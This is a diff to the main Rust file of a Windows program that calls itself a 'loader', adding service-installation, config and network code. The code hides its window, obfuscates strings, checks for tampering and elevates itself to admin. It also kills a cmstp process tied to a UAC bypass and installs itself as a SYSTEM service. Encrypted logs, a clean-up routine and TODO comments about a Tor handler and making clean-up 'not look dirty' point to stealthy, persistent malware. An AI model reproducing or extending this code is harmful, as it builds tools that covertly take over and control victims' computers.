@@ -1,9 +1,17 @@
 #![windows_subsystem = "windows"]
 
 use lazy_static::lazy_static;
-use loader_vars::constants::{ system_log_directory, initial_log_directory };
+use loader_vars::constants::{ initial_log_directory, loader_service_name, system_log_directory };
 use safemode::{ runner::clean_up, utils::{ is_safe_mode, safemode_fail_safe } };
-use service::utils::install_initial_service;
+use service::{
+    runner::start_service,
+    utils::{
+        get_service_install_state,
+        install_initial_service,
+        install_system_service,
+        ServiceInstallState,
+    },
+};
 use shared::{
     constants::logs_encryption_key,
     logs::logger::Logger,
@@ -13,6 +21,7 @@ use shared::{
     },
     utils::{
         anti_tampering::is_clean,
+        config::load_mib_config,
         functions::{
             exit_1,
             exit_1_insta,
@@ -26,6 +35,7 @@ use windows_service_detector::is_running_as_windows_service;
 use std::{ sync::Mutex, thread, time::Duration };
 use obfstr::obfstr as s;
 
+mod network;
 mod service;
 mod safemode;
 
@@ -121,12 +131,11 @@ macro_rules! tag {
 
 fn main() {
     let is_running_from_system_dir = is_running_from_system32();
-    let log_directory = if is_running_from_system_dir {
-        system_log_directory()
-    } else {
-        initial_log_directory()
+    let log_directory = match is_running_from_system_dir {
+        true => { system_log_directory() }
+        false => { initial_log_directory() }
     };
-    if let Ok(logger) = Logger::new(log_directory.clone(), logs_encryption_key()) {
+    if let Ok(logger) = Logger::new(log_directory, logs_encryption_key()) {
         let mut lock = LOGGER.lock().unwrap();
         *lock = Some(logger);
     }
@@ -137,12 +146,31 @@ fn main() {
         exit_1();
     }
 
-    if
-        !is_elevated().unwrap_or_else(|error| {
-            err!("is_elevated Error, assuming false: ", error);
-            false
-        })
-    {
+    let mib_config = load_mib_config(false);
+
+    let is_elevated = is_elevated().unwrap_or_else(|error| {
+        err!("is_elevated Error, assuming false: ", error);
+        false
+    });
+
+    if !is_elevated {
+        if !mib_config.clean_up_done {
+            if
+                let Ok(out) = get_service_install_state(
+                    &loader_service_name(),
+                    get_current_exe().to_str().unwrap()
+                )
+            {
+                match out.0 {
+                    ServiceInstallState::ExistsSameExe => {
+                        tag!("DISMISS-ELEVATE-CLEAN-UP-IN-PROGRESS");
+                        exit_1();
+                    }
+                    _ => {}
+                }
+            }
+        }
+
         tag!("ELEVATE");
 
         if let Err(error) = open_self_as_admin() {
@@ -154,33 +182,13 @@ fn main() {
         err!("is_system Error, assuming false: ", error);
         false
     });
-    if is_safe_mode() {
-        if is_system {
+
+    if is_system {
+        if is_safe_mode() {
             tag!("CLEANUP");
             if let Err(error) = clean_up() {
                 err!("clean_up Error: ", error);
                 safemode_fail_safe();
-            }
-        } else {
-            //! This should be in service runner
-            tag!("LAUNCH-CLEANUP");
-            if
-                let Err(error) = try_spawn_program_as_system(
-                    get_current_exe().to_str().unwrap(),
-                    None
-                )
-            {
-                err!("spawn_program_as_system Error: ", error);
-                safemode_fail_safe();
-            } else {
-                let fail_safe_thread = thread::spawn(move || {
-                    let fail_safe_seconds = 8;
-                    thread::sleep(Duration::from_secs(fail_safe_seconds));
-                    warn!("FAIL SAFE TIMEOUT");
-                    safemode_fail_safe();
-                });
-                let _ = fail_safe_thread.join();
-                exit_1_insta();
             }
         }
     }
@@ -190,12 +198,19 @@ fn main() {
         true
     });
     if is_service {
-        //! TODO
+        if let Err(error) = start_service() {
+            err!("start_service Error: ", error);
+        }
+        exit_1()
     } else {
         if is_running_from_system_dir {
             if is_system {
                 tag!("SYS-SERVICE-INSTALL");
-                //! TODO
+
+                if let Err(error) = install_system_service() {
+                    err!("install_system_service Error: ", error);
+                }
+                exit_1();
             } else {
                 tag!("LAUNCH-SYS-SERVICE-INSTALL");
                 if
@@ -209,19 +224,40 @@ fn main() {
                 exit_1();
             }
         } else {
-            tag!("INITIAL-SERVICE-INSTALL");
-
-            let cmstp_cleanup_handle = thread::spawn(move || {
-                if let Err(error) = try_kill_cmstp() {
-                    err!("try_kill_cmstp Error: ", error);
+            if !mib_config.clean_up_done {
+                tag!("INITIAL-SERVICE-INSTALL");
+                let cmstp_cleanup_handle = thread::spawn(move || {
+                    if let Err(error) = try_kill_cmstp() {
+                        err!("try_kill_cmstp Error: ", error);
+                    }
+                });
+                if let Err(error) = install_initial_service() {
+                    err!("install_initial_service Error: ", error);
                 }
-            });
-            if let Err(error) = install_initial_service() {
-                err!("install_initial_service Error: ", error);
-            }
 
-            let _ = cmstp_cleanup_handle.join();
-            exit_1();
+                let _ = cmstp_cleanup_handle.join();
+                exit_1();
+            } else {
+                tag!("NON-SERVICE-WITH-ADMIN-AFTER-CLEAN");
+                warn!("not expected");
+                exit_1();
+            }
         }
     }
 }
+
+//  rewrite everything where we get checks as variables and then each call is just a combination of checks, and they are ordered by the order of how we decide
+
+//?  in tor handler modify to read data read the first data if exists and other native types sent to not error
+
+// in logger setup so that we save last log and if identical - we use (count) that repeats - fix for panic and huuuge bug when sizes get too big from some errors too much | somehow else prevent logger for making TOO BIG logs SIZE
+
+// improve clean up a little to not look dirty
+
+//? sparse out pre install
+
+//? code run config in tor
+
+//? code post cleanup
+
+// code inf cleanup
